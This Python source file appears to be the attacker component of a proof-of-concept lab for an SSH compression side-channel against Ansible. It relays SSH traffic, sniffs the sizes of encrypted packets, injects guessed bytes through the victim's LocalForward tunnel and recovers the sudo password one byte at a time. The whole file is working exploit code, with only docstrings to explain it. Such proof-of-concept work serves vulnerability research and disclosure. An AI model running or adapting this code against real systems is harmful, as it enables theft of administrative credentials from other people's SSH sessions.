"""Attacker for the Ansible SSH Compression Vulnerability PoC.

Three functions in one process:
1. TCP forwarder :2222 -> server:22 (passive relay, no SSH termination).
2. scapy sniffer observing encrypted packet sizes on port 22/2222.
3. HTTP API on :9000 driving the byte-by-byte password recovery.
"""

from __future__ import annotations

import asyncio
import logging
import os
import threading
import time
from typing import Any

import aiohttp
from aiohttp import web
from scapy.all import AsyncSniffer  # type: ignore
from scapy.layers.inet import IP, TCP  # type: ignore

LOG = logging.getLogger("attacker")

SERVER_HOST = os.environ.get("SERVER_HOST", "server")
SERVER_PORT = int(os.environ.get("SERVER_PORT", "22"))
LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))
HTTP_PORT = int(os.environ.get("HTTP_PORT", "9000"))
CLIENT_BASE = os.environ.get("CLIENT_BASE", "http://client:8000")
CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
FWD_PORT = int(os.environ.get("FWD_PORT", "15432"))

SNIFF_IFACE = os.environ.get("SNIFF_IFACE", "eth0")
SNIFF_FILTER = f"tcp and (port {SERVER_PORT} or port {LISTEN_PORT})"

# Noise bytes: DEFLATE fixed-Huffman 8-bit literals (0x80..0x8F) absent
# from plausible content.  Each costs exactly 8 compressed bits.
_NOISE_POOL = list(range(0x80, 0x90))


def _make_noise(n: int) -> bytes:
    return bytes(_NOISE_POOL[:n])


# -- Packet log (thread-safe; scapy thread -> asyncio) ------------------

class PacketLog:
    def __init__(self) -> None:
        self._records: list[dict[str, int]] = []
        self._lock = threading.Lock()

    def add(self, rec: dict[str, int]) -> None:
        with self._lock:
            self._records.append(rec)

    def clear(self) -> None:
        with self._lock:
            self._records.clear()

    def c2s_bytes(self) -> int:
        with self._lock:
            return sum(r["len"] for r in self._records
                       if r["dport"] == LISTEN_PORT and r["len"] > 0)


PACKET_LOG = PacketLog()


def _on_packet(pkt) -> None:
    if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
        return
    ip, tcp = pkt[IP], pkt[TCP]
    payload_len = ip.len - (ip.ihl * 4) - (tcp.dataofs * 4)
    PACKET_LOG.add({"dport": int(tcp.dport), "len": int(payload_len)})


# -- TCP forwarder client:2222 <-> server:22 ----------------------------

async def _pipe(src: asyncio.StreamReader, dst: asyncio.StreamWriter) -> None:
    try:
        while True:
            data = await src.read(65536)
            if not data:
                break
            dst.write(data)
            await dst.drain()
    except (ConnectionResetError, BrokenPipeError, asyncio.IncompleteReadError):
        pass
    finally:
        try:
            dst.close()
        except Exception:
            pass


async def _handle_inbound(reader: asyncio.StreamReader,
                          writer: asyncio.StreamWriter) -> None:
    try:
        up_r, up_w = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)
    except OSError as exc:
        LOG.warning("upstream connect failed: %s", exc)
        writer.close()
        return
    await asyncio.gather(_pipe(reader, up_w), _pipe(up_r, writer))


# -- Attack -------------------------------------------------------------

async def _open_measure_tunnel():
    """Connect to the victim's LocalForward port."""
    for _ in range(40):
        try:
            return await asyncio.open_connection(CLIENT_HOST, FWD_PORT)
        except OSError:
            await asyncio.sleep(0.1)
    raise OSError("measure tunnel not reachable")


async def _trigger_ansible(session: aiohttp.ClientSession) -> None:
    """Start a fresh ansible-playbook run; returns after the sudo
    password has been written to ssh's stdin."""
    async with session.post(f"{CLIENT_BASE}/send_secret_ansible") as r:
        body = await r.json()
        if not body.get("ok"):
            raise RuntimeError(f"send_secret_ansible failed: {body}")


async def _sweep(
    session: aiohttp.ClientSession,
    prefix: bytes,
    alphabet: list[bytes],
    noise_len: int,
    settle: float,
) -> dict[bytes, int]:
    """Measure wire-byte cost for each candidate character.

    Per candidate: trigger ansible (password enters zlib context) -> open
    measure tunnel -> clear packet log -> write guess -> read wire size.
    """
    result: dict[bytes, int] = {}
    noise = _make_noise(noise_len)
    for cand in alphabet:
        await _trigger_ansible(session)
        _, mw = await _open_measure_tunnel()
        await asyncio.sleep(settle)
        PACKET_LOG.clear()
        try:
            mw.write(prefix + cand + noise)
            await mw.drain()
        except (ConnectionResetError, BrokenPipeError, OSError) as exc:
            LOG.warning("measure write failed: %s", exc)
        await asyncio.sleep(settle)
        result[cand] = PACKET_LOG.c2s_bytes()
        try:
            mw.close()
        except Exception:
            pass
    return result


async def _recover_byte(
    session: aiohttp.ClientSession,
    prefix: bytes,
    alphabet: list[bytes],
    noise_len: int,
    settle: float,
    label: str,
) -> bytes:
    """Recover one byte: sweep all candidates, pick the shortest."""
    measurements = await _sweep(session, prefix, alphabet, noise_len, settle)
    ranked = sorted(measurements.items(), key=lambda kv: kv[1])
    best = ranked[0][0]
    margin = ranked[1][1] - ranked[0][1] if len(ranked) > 1 else 0
    LOG.info("%s best=%r margin=%d", label, best.decode("latin-1"), margin)
    return best


async def run_attack(
    known_prefix: bytes,
    alphabet_str: str,
    max_length: int,
    terminator: bytes,
    noise_hints: list[int],
    settle: float = 0.1,
) -> dict[str, Any]:
    alphabet = [bytes([c]) for c in alphabet_str.encode("latin-1")]
    if terminator not in alphabet:
        alphabet.append(terminator)

    LOG.info("attack start: prefix=%r alphabet=%d max_length=%d",
             known_prefix, len(alphabet), max_length)
    started = time.time()
    recovered = b""

    timeout = aiohttp.ClientTimeout(total=7200)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        for pos in range(max_length):
            # Constant-length prefix trimming: keep len(prefix + cand)
            # stable so LZ77 matches stay in the same DEFLATE length-code bin.
            full_prefix = known_prefix + recovered
            trim = max(0, len(full_prefix) - len(known_prefix))
            full_prefix = full_prefix[trim:]

            noise_len = noise_hints[pos] if pos < len(noise_hints) else 1

            best = await _recover_byte(
                session, full_prefix, alphabet, noise_len,
                settle, f"pos {pos:2d}",
            )
            if best == terminator:
                LOG.info("pos %2d: terminator -> done", pos)
                break
            recovered += best
            LOG.info("recovered so far: %r", recovered.decode("latin-1"))

    elapsed = time.time() - started
    LOG.info("attack done in %.1fs: %r", elapsed, recovered.decode("latin-1"))
    return {
        "recovered": recovered.decode("latin-1"),
        "elapsed_seconds": elapsed,
    }


# -- HTTP API -----------------------------------------------------------

async def handle_status(request: web.Request) -> web.Response:
    return web.json_response({"ok": True})


async def handle_run_attack(request: web.Request) -> web.Response:
    body = await request.json()
    try:
        known_prefix = body["known_prefix"].encode("latin-1")
        alphabet = body["alphabet"]
        max_length = int(body["max_length"])
        terminator = body.get("terminator", "\n").encode("latin-1")
        noise_hints = [int(n) for n in body.get("noise_hints", [])]
    except (KeyError, ValueError) as exc:
        return web.json_response({"ok": False, "error": str(exc)}, status=400)
    try:
        result = await run_attack(
            known_prefix=known_prefix,
            alphabet_str=alphabet,
            max_length=max_length,
            terminator=terminator,
            noise_hints=noise_hints,
        )
    except Exception as exc:
        LOG.exception("attack failed")
        return web.json_response({"ok": False, "error": str(exc)}, status=500)
    return web.json_response({"ok": True, **result})


# -- main ---------------------------------------------------------------

async def main() -> int:
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(name)s %(levelname)s %(message)s",
    )
    logging.getLogger("aiohttp.access").setLevel(logging.WARNING)

    LOG.info("sniffer start iface=%s filter=%r", SNIFF_IFACE, SNIFF_FILTER)
    sniffer = AsyncSniffer(
        iface=SNIFF_IFACE, filter=SNIFF_FILTER, prn=_on_packet, store=False,
    )
    sniffer.start()

    fwd = await asyncio.start_server(_handle_inbound, host="0.0.0.0", port=LISTEN_PORT)
    LOG.info("forwarder :%d -> %s:%d", LISTEN_PORT, SERVER_HOST, SERVER_PORT)

    app = web.Application()
    app.router.add_get("/status", handle_status)
    app.router.add_post("/run_attack", handle_run_attack)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", HTTP_PORT)
    await site.start()
    LOG.info("HTTP API on :%d", HTTP_PORT)

    try:
        async with fwd:
            await fwd.serve_forever()
    finally:
        sniffer.stop()
    return 0


if __name__ == "__main__":
    import sys
    try:
        sys.exit(asyncio.run(main()))
    except (KeyboardInterrupt, SystemExit):
        pass
